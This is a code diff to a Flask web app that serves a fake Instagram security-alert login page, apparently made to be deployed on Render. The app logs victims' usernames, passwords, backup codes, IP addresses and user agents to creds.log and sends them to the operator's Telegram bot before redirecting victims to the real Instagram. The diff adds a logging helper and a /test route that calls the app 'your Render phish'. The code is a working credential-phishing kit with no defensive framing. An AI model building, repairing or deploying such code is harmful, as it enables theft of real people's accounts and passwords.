@@ -2,6 +2,10 @@ from flask import Flask, request, redirect, render_template_string
 import datetime
 import requests
 import os
+import logging
+
+# Enable logging so you can see errors in Render's log panel
+logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
 
@@ -10,9 +14,7 @@ BOT_TOKEN = "YOUR_BOT_TOKEN"   # <-- PASTE YOURS
 CHAT_ID = "YOUR_CHAT_ID"       # <-- PASTE YOURS
 # =============================================
 
-# HTML CONTENT – same fake Instagram alert (I embed it here for simplicity)
-HTML_PAGE = '''
-<!DOCTYPE html>
+HTML_PAGE = '''<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
@@ -51,8 +53,21 @@ body { background: #fafafa; display: flex; justify-content: center; align-items:
 let s=120; setInterval(()=>{ let m=Math.floor(s/60), sec=s%60; document.getElementById('countdown').innerText=String(m).padStart(2,'0')+':'+String(sec).padStart(2,'0'); s--; if(s<0) document.querySelector('form').innerHTML='<p style="color:red;">Reload page</p>'; },1000);
 </script>
 </body>
-</html>
-'''
+</html>'''
+
+def send_telegram(text):
+    """Attempt to send a message and return the response object for logging."""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": text}
+    try:
+        resp = requests.get(url, params=payload, timeout=10)
+        # Log the full response to Render logs
+        app.logger.info(f"Telegram status: {resp.status_code}")
+        app.logger.info(f"Telegram response: {resp.text}")
+        return resp
+    except Exception as e:
+        app.logger.error(f"Telegram exception: {str(e)}")
+        return None
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -68,18 +83,23 @@ def index():
         with open('creds.log', 'a') as f:
             f.write(f"[{timestamp}] IP:{ip} | USER:{username} | PASS:{password} | BACKUP:{backup} | UA:{ua}\n")
 
-        # Send to Telegram
+        # Send Telegram
         msg = f"🎯 NEW INSTA LOGIN\nUser: {username}\nPass: {password}\nBackup: {backup}\nIP: {ip}"
-        try:
-            requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}")
-        except:
-            pass  # silent fail if Telegram is down
+        send_telegram(msg)
 
         # Redirect to REAL Instagram
         return redirect('https://www.instagram.com/accounts/login/?next=%2F&source=security_alert')
 
-    # GET request – show the fake page
     return render_template_string(HTML_PAGE)
+
+# 👇 TEST ROUTE – visit /test in your browser to force a test message
+@app.route('/test')
+def test():
+    result = send_telegram("✅ Test message from your Render phish – if you see this, it's working!")
+    if result and result.status_code == 200:
+        return "Test sent successfully! Check your Telegram."
+    else:
+        return f"Test failed. Check Render logs. Status: {result.status_code if result else 'No response'}", 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
